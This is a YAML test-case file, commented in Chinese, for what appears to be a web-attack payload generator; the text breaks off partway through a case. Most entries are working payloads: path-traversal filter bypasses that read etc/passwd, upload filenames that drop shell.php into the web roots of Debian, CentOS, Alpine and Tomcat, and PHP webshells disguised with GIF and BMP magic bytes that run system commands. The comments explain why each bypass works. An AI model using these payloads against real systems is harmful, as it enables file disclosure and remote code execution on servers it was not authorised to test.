  # ================= traversal.generic.dotdot.bypass · form =================
  # 穿越序列的四种变形，seq 字段由 `<<rep(depth,form.seq)>>` 重复 depth 次（默认 3）。
  # filepath 取相对路径（和已有样本一致），前面不额外加斜杠。

  - name: traversal.generic.dotdot.bypass · form=nested
    state:
      vuln: traversal
      template: traversal.generic.dotdot.bypass
      slots: {form: nested}
      vars: {filepath: etc/passwd}
      outputs: [raw]
    expect:
      payload: "....//....//....//etc/passwd"

  - name: traversal.generic.dotdot.bypass · form=dot_slash
    state:
      vuln: traversal
      template: traversal.generic.dotdot.bypass
      slots: {form: dot_slash}
      vars: {filepath: etc/passwd}
      outputs: [raw]
    expect:
      # ..;/ 靠 Tomcat 把 ; 后面的当路径参数吃掉才还原成 ../
      payload: "..;/..;/..;/etc/passwd"

  - name: traversal.generic.dotdot.bypass · form=overlong
    state:
      vuln: traversal
      template: traversal.generic.dotdot.bypass
      slots: {form: overlong}
      vars: {filepath: etc/passwd}
      outputs: [raw]
    expect:
      payload: "..%c0%af..%c0%af..%c0%afetc/passwd"

  - name: traversal.generic.dotdot.bypass · form=backslash
    state:
      vuln: traversal
      template: traversal.generic.dotdot.bypass
      slots: {form: backslash}
      vars: {filepath: etc/passwd}
      outputs: [raw]
    expect:
      # Windows 分隔符；单引号标量保证反斜杠不被 YAML 吃掉
      payload: '..\..\..\etc/passwd'

  # ================= upload.generic.filename.traversal · webroot =================
  # 四个选项是四种部署的**绝对路径去掉前导斜杠**——因为 depth 槽位的值以 `/` 结尾，
  # 前导斜杠只能有一处，写重了就是 `//var/www/html`。
  # ext 取默认 .php，name 是变量。

  - name: upload.generic.filename.traversal · webroot=debian
    state:
      vuln: upload
      template: upload.generic.filename.traversal
      slots: {webroot: debian}
      vars: {name: shell}
      outputs: [raw]
    expect:
      payload: "/../../../../var/www/html/shell.php"

  - name: upload.generic.filename.traversal · webroot=centos
    state:
      vuln: upload
      template: upload.generic.filename.traversal
      slots: {webroot: centos}
      vars: {name: shell}
      outputs: [raw]
    expect:
      # CentOS 的 nginx 根是 /usr/share/nginx/html，不是 /var/www
      payload: "/../../../../usr/share/nginx/html/shell.php"

  - name: upload.generic.filename.traversal · webroot=alpine
    state:
      vuln: upload
      template: upload.generic.filename.traversal
      slots: {webroot: alpine}
      vars: {name: shell}
      outputs: [raw]
    expect:
      payload: "/../../../../var/www/localhost/htdocs/shell.php"

  - name: upload.generic.filename.traversal · webroot=tomcat
    state:
      vuln: upload
      template: upload.generic.filename.traversal
      slots: {webroot: tomcat}
      vars: {name: shell}
      outputs: [raw]
    expect:
      # Tomcat 的 Web 根是 webapps/ROOT（大写）
      payload: "/../../../../usr/local/tomcat/webapps/ROOT/shell.php"

  # ================= upload.generic.content.magic · magic =================
  # 文件头是**给人眼和检测器看的**，各语言的魔数不能混：
  # GIF89a / GIF87a / BM / %PDF-1.4 / RIFF....WEBP。
  # body 里 `<<magic.head>>` 后面紧跟 `<?php`，中间不加任何分隔。

  - name: upload.generic.content.magic · magic=gif
    state:
      vuln: upload
      component: php
      template: upload.generic.content.magic
      slots: {magic: gif}
      vars: {cmd: whoami}
      outputs: [raw]
    expect:
      payload: "GIF89a<?php system('whoami'); ?>"

  - name: upload.generic.content.magic · magic=gif87
    state:
      vuln: upload
      component: php
      template: upload.generic.content.magic
      slots: {magic: gif87}
      vars: {cmd: whoami}
      outputs: [raw]
    expect:
      # GIF87a 与 GIF89a 只差最后一字符，是这两个选项唯一能互相区分的地方
      payload: "GIF87a<?php system('whoami'); ?>"

  - name: upload.generic.content.magic · magic=bmp
    state:
      vuln: upload
      component: php
      template: upload.generic.content.magic
      slots: {magic: bmp}
      vars: {cmd: whoami}
      outputs: [raw]
    expect:
      payload: "BM<?php system('whoami'); ?>"

  - name: upload.generic.content.magic · magic=pdf
    state:
      vuln: upload
      component: php
      template: upload.generic.content.magic
      slots: {magic: pdf}
      vars: {cmd: whoami}
